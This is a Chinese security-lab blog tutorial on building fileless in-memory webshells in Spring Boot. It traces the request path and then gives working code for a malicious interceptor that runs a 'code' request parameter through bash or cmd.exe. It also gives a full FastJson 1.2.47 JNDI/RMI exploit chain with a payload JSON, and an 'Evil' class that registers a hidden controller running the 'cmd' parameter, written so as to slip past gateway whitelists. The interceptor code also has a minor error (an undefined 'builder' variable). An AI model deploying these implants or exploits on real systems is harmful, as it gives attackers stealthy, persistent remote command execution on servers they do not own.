##  深入浅出内存马(二) 之SpringBoot内存马（文末视频教学）

原创 风炫安全  [ 雷石安全实验室 ](javascript:void\(0\);)

**雷石安全实验室** ![]()

微信号 leishianquan1

功能介绍 雷石安全实验室以团队公众号为平台向安全工作者不定期分享渗透、APT、企业安全建设等新鲜干货，团队公众号致力于成为一个实用干货分享型公众号。

____

__

收录于话题

#内存马 2

#SpringBoot内存马 1

#代码审计 1

  

## 0x01 前言

在上一篇文章中[深入浅出内存马（一）](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247511913&idx=1&sn=748f64838d510dd0da93732fda443f44&scene=21#wechat_redirect)，我介绍了基于`Tomcat`的`Filter`内存马，不光是`Filter`
还有`listener`、`servlet`、`controller`
等不同形式的内存马。如今企业开发过程中，大部分使用的都是spring系列的框架进行开发，特别是SpringBoot，现在基本是企业开发的标配。所以探讨Spring系列下的内存马就显得非常必要了。

今天我们就来研究研究Spring Boot下的内存马实现。

## 0x02 需求

随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关，复杂均衡，防火墙。所以如果你新建的shell路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃，我们该如何解决这个问题？

 **所以，在注入内存马的时候，就尽量不要用新建的路由，或者shell地址。最好是在访问正常的业务地址之前，就能执行我们的代码。**

根据这个文章里面的说法基于内存 Webshell 的无文件攻击技术研究

在经过一番文档查阅和源码阅读后，发现可能有不止一种方法可以达到以上效果。其中通用的技术点主要有以下几个：

  1. 在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；
  2. 在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；
  3. controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；

## 0x03 SpringBoot的生命周期

为了满足上面的需求，我们需要了解SpringBoot的生命周期，我们需要研究的是：一个请求到到应用层之前，需要经过那几个部分？是如何一步一步到到我们的Controller的?

我们用IDEA来搭建一个SpingBoot2 的环境

![](https://gitee.com/fuli009/images/raw/master/public/20210826121801.png)

访问地址：

![](https://gitee.com/fuli009/images/raw/master/public/20210826121802.png)

我们还是把断点打在`org.apache.catalina.core.ApplicationFilterChain`中的
`internalDoFilter`方法中

![](https://gitee.com/fuli009/images/raw/master/public/20210826121803.png)

可以看到整个执行流程

![](https://gitee.com/fuli009/images/raw/master/public/20210826121804.png)

这部分在上一篇文章中已经详细描述过，这里不在赘述。

但是这里不同的是在经过 Filter 层面处理后，就会进入熟悉的 `spring-webmvc` 组件
`org.springframework.web.servlet.DispatcherServlet` 类的 `doDispatch` 方法中。

![](https://gitee.com/fuli009/images/raw/master/public/20210826121805.png)

跟进去这个方法

![]()

可以看到是遍历`this.handlerMappings` 这个迭代器中的`mapper`的`getHandler`
方法处理Http中的request请求。

继续追踪，最终会调用到`org.springframework.web.servlet.handler.AbstractHandlerMapping` 类的
`getHandler` 方法，并通过 `getHandlerExecutionChain(handler, request)` 方法返回
`HandlerExecutionChain` 类的实例。

![](https://gitee.com/fuli009/images/raw/master/public/20210826121806.png)

继续跟进`getHandlerExecutionChain` 方法，

![](https://gitee.com/fuli009/images/raw/master/public/20210826121807.png)

    
    
       protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {  
            HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);  
            Iterator var4 = this.adaptedInterceptors.iterator();  
      
            while(var4.hasNext()) {  
                HandlerInterceptor interceptor = (HandlerInterceptor)var4.next();  
                if (interceptor instanceof MappedInterceptor) {  
                    MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;  
                    if (mappedInterceptor.matches(request)) {  
                        chain.addInterceptor(mappedInterceptor.getInterceptor());  
                    }  
                } else {  
                    chain.addInterceptor(interceptor);  
                }  
            }  
        //返回的是HandlerExecutonChain，这里包含了所有的拦截器  
            return chain;  
        }  
    

好了，现在我们知道程序在哪里加入的拦截器(`interceptor`)后，追踪到这行代码

    
    
    if (!mappedHandler.applyPreHandle(processedRequest, response)) {  
        return;  
    }  
    

跟进之后发现`interceptor.preHandle(request, response, this.handler)`
会遍历拦截器，并执行其`preHandle`方法。

![](https://gitee.com/fuli009/images/raw/master/public/20210826121808.png)

如果程序提前在调用的 `Controller` 上设置了 `Aspect`（切面），那么在正式调用 `Controller`
前实际上会先调用切面的代码，一定程度上也起到了 "拦截" 的效果。

那么总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层：

    
    
    HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Aspect --> Controller  
    

## 0x04 拦截器`Interceptor` 的理论探索

用 `Interceptor` 来拦截所有进入 `Controller` 的 http 请求理论上是可行的，接下来就是实现从代码层面动态注入一个
`Interceptor` 来达到 `webshell` 的效果。

可以通过继承 `HandlerInterceptorAdapter` 类或者`HandlerInterceptor` 类并重写其 preHandle
方法实现拦截。preHandle是请求执行前执行，preHandle 方法中写一些拦截的处理，比如下面，当请求参数中带 id 时进行拦截，并写入字符串
InterceptorTest OK! 到 response。

### 0x0401 模拟真实业务

真实业务，这里模拟一个登录场景，登录成功返回login success。

    
    
    package com.evalshell.springboot.web;  
      
    import com.evalshell.springboot.model.User;  
    import org.springframework.beans.factory.annotation.Autowired;  
    import org.springframework.stereotype.Controller;  
    import org.springframework.web.bind.annotation.RequestMapping;  
    import org.springframework.web.bind.annotation.ResponseBody;  
      
    import javax.servlet.http.HttpServletRequest;  
      
    @Controller  
    @RequestMapping(value = "/user")  
    public class UserCrotroller {  
      
        @RequestMapping(value = "/login")  
        public @ResponseBody Object login(HttpServletRequest request){  
          //简单模拟登录成功  
          //实体类User 我就不赘述了，就是有2个属性。并实现getter和setter 构造器方法  
            User user = new User();  
            user.setAge(18);  
            user.setName("jack");  
            request.getSession().setAttribute("user", user);  
            return "login success";  
        }  
    }  
      
    

### 0x0402 **编写自定义的`Interceptor`**

    
    
      
    package com.evalshell.springboot.interceptor;  
      
    import org.springframework.web.servlet.HandlerInterceptor;  
    import org.springframework.web.servlet.ModelAndView;  
      
    import javax.servlet.http.HttpServletRequest;  
    import javax.servlet.http.HttpServletResponse;  
      
    public class VulInterceptor implements HandlerInterceptor {  
        @Override  
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {  
            String code = request.getParameter("code");  
            if(code != null){  
                try {  
                    java.io.PrintWriter writer = response.getWriter();  
                    ProcessBuilder p;  
                    if(System.getProperty("os.name").toLowerCase().contains("win")){  
                        p = new ProcessBuilder(new String[]{"cmd.exe", "/c", code});  
                    }else{  
                        System.out.println(code);  
                        p = new ProcessBuilder(new String[]{"/bin/bash", "-c", code});  
                    }  
                    builder.redirectErrorStream(true);  
                    Process p = builder.start();  
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));  
                    String result = r.readLine();  
                    System.out.println(result);  
                    writer.println(result);  
                    writer.flush();  
                    writer.close();  
                }catch (Exception e){  
                }  
                return false;  
            }  
            return true;  
        }  
      
        @Override  
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {  
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);  
        }  
      
        @Override  
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {  
            HandlerInterceptor.super.afterCompletion(request, response, handler, ex);  
        }  
    }  
      
    

### 0x0403 注册拦截器

实现拦截器后还需要将拦截器注册到spring容器中，可以通过implements
WebMvcConfigurer，覆盖其addInterceptors(InterceptorRegistry registry)方法

    
    
    package com.evalshell.springboot.config;  
      
    import com.evalshell.springboot.interceptor.VulInterceptor;  
    import org.springframework.context.annotation.Configuration;  
    import org.springframework.web.servlet.config.annotation.InterceptorRegistry;  
    import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;  
      
    @Configuration  
    public class InterceptorConfig implements WebMvcConfigurer {  
        @Override  
        public void addInterceptors(InterceptorRegistry registry) {  
          //这里是配置需要拦截的路由  
            String[] VulPathPatterns = {"/user/login"};  
      
            registry.addInterceptor(new VulInterceptor()).addPathPatterns(VulPathPatterns);  
        }  
    }  
      
    

可以看到达到的效果是访问正常路由，不会影响正常业务。如果是带有code的参数会执行code里面的代码，从而突破网关的限制。

那么我们现在已经明白了如何在springboot中进行拦截，并执行我们的内存马，但是还是有一个问题，如何注入我们的内存马？

在这里根据landgrey大佬的思路：

> spring boot 初始化过程中会往 `org.springframework.context.support.LiveBeansView` 类的
> `applicationContexts` 属性中添加
> `org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext`
> 类的对象。bean 实例名字是 `requestMappingHandlerMapping` 或者比较老版本的
> `DefaultAnnotationHandlerMapping` 。那么获取 `adaptedInterceptors` 属性值就比较简单了：
>  
>  
>     org.springframework.web.servlet.handler.AbstractHandlerMapping
> abstractHandlerMapping =
> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");  
>     > java.lang.reflect.Field field =
> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");  
>     > field.setAccessible(true);  
>     > java.util.ArrayList<Object> adaptedInterceptors =
> (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);  
>     >

我总结下就是：

  * 首先获取应用的上下文环境，也就是`ApplicationContext`
  * 然后从 `ApplicationContext` 中获取 `AbstractHandlerMapping` 实例（用于反射）
  * 反射获取 `AbstractHandlerMapping`类的 `adaptedInterceptors`字段
  * 通过 `adaptedInterceptors`注册拦截器

## 0x05  实战

为了方便搭建环境，我们采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点，我们在pom.xml中配置好我们的依赖，

    
    
     <dependencies>  
        <!-- 配置fastjson -->  
      <dependency>  
       <groupId>com.alibaba</groupId>  
       <artifactId>fastjson</artifactId>  
       <version>1.2.47</version>  
      </dependency>  
            <!-- 配置springboot2 ，小编使用的是2.5.3的版本-->  
        <dependency>  
       <groupId>org.springframework.boot</groupId>  
       <artifactId>spring-boot-starter-web</artifactId>  
      </dependency>  
     </dependencies>  
    

手动创建一个FastJson的利用点，因为在 JDK 18u191, 11.0.1之后
`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为false，为了演示，我这里是用了JDK
18u102。``

    
    
    @Controller  
    public class VulController {  
      
        @RequestMapping(value = "/unserializer")  
        @ResponseBody  
        public String unserializer(@RequestParam String code){  
            JSON.parse(code);  
            return "unserializer";  
        }  
    }  
    

创建RMI服务器

    
    
    package com.evalshell.server;  
      
    import com.sun.jndi.rmi.registry.ReferenceWrapper;  
    import javax.naming.Reference;  
    import java.rmi.registry.LocateRegistry;  
    import java.rmi.registry.Registry;  
      
    public class JNDIServer {  
        public static void main(String[] args) throws Exception {  
            Registry registry = LocateRegistry.createRegistry(1099);  
            Reference reference = new Reference("TouchFile",  
                    "com.evalshell.server.TouchFile","http://127.0.0.1:8083/");  
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);  
            registry.bind("Exploit", referenceWrapper);  
        }  
    }  
      
    

创建恶意代码

    
    
    package com.evalshell.server;  
    import java.lang.Runtime;  
    import java.lang.Process;  
      
    public class TouchFile {  
        static {  
            try {  
                Runtime rt = Runtime.getRuntime();  
                String[] commands = {"open", "/System/Applications/Calculator.app"};  
                Process pc = rt.exec(commands);  
                pc.waitFor();  
            } catch (Exception e) {  
                // do nothing  
            }  
        }  
    }  
    

启动JNDIServer，端口启动在了1099

![](https://gitee.com/fuli009/images/raw/master/public/20210826121809.png)

在TouchFile的编译后的类路径下，开启web服务，提供恶意类文件的http下载服务，这个端口必须和上面的JNDIServer中配置的一致。

![](https://gitee.com/fuli009/images/raw/master/public/20210826121810.png)

我们使用FastJson的Payload进行攻击

    
    
    {  
        "a":{  
            "@type":"java.lang.Class",  
            "val":"com.sun.rowset.JdbcRowSetImpl"  
        },  
        "b":{  
            "@type":"com.sun.rowset.JdbcRowSetImpl",  
            "dataSourceName":"rmi://127.0.0.1:1099/TouchFile",  
            "autoCommit":true  
        }  
    }  
    

用postman请求，攻击成功的话，就会弹出计算器，表示可以执行任意命令。

![](https://gitee.com/fuli009/images/raw/master/public/20210826121811.png)

好的，上述已经搭建起一个Fastjson的漏洞环境。

使用上述方法编写拦截器内存马：

    
    
    package com.evalshell.server;  
    import org.springframework.web.context.WebApplicationContext;  
    import org.springframework.web.context.request.RequestContextHolder;  
    import org.springframework.web.context.request.ServletRequestAttributes;  
    import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;  
    import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;  
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;  
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;  
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  
      
    import javax.servlet.http.HttpServletRequest;  
    import javax.servlet.http.HttpServletResponse;  
    import java.io.IOException;  
    import java.lang.reflect.InvocationTargetException;  
    import java.lang.reflect.Method;  
    public class Evil {  
        public Evil() throws Exception{  
            // 关于获取Context的方式有多种  
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.  
                    currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);  
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);  
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");  
            method.setAccessible(true);  
            // 通过反射获得该类的test方法  
            Method method2 = Evil.class.getMethod("test");  
            // 定义该controller的path  
            PatternsRequestCondition url = new PatternsRequestCondition("/good");  
            // 定义允许访问的HTTP方法  
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();  
            // 构造注册信息  
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);  
            // 创建用于处理请求的对象，避免无限循环使用另一个构造方法  
            Evil injectToController = new Evil("aaa");  
            // 将该controller注册到Spring容器  
            mappingHandlerMapping.registerMapping(info, injectToController, method2);  
        }  
      
        private Evil(String aaa) {  
        }  
      
        public void test() throws IOException {  
            // 获取请求  
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();  
            // 获取请求的参数cmd并执行  
            // 类似于PHP的system($_GET["cmd"])  
            Runtime.getRuntime().exec(request.getParameter("cmd"));  
        }  
      
    }  
    

同时修改JNDIServer类中的代码

将`Reference reference = new Reference("VulClass",
"com.evalshell.server.VulClass","http://127.0.0.1:8083/");` 替换成 `Reference
reference = new
Reference("Evil","com.evalshell.server.Evil","http://127.0.0.1:8083/");`

最后演示一下，使用fastjson RCE进行攻击并动态写入我们的内存马

至此，我们已经完成SpringBoot下的无文件内存马的实现！

## 0x06 参考

https://landgrey.me/blog/19/

https://www.anquanke.com/post/id/198886#h2-0

https://evalshell.com/

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

深入浅出内存马(二) 之SpringBoot内存马（文末视频教学）

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

